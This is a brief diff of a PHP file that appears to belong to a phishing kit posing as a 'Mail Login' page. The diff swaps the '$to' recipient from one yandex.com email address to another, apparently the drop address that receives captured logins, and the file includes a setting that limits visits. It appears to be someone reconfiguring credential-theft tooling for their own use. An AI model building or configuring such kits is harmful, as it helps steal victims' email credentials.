@@ -1,5 +1,5 @@
 <?php
-$to  = 'kingkunta101@yandex.com';
+$to  = 'traptrill@yandex.com';
 //To allow access only once change use $multi_visit = 1;
 $multi_visit = 0;
 $h1 = "Mail Login";
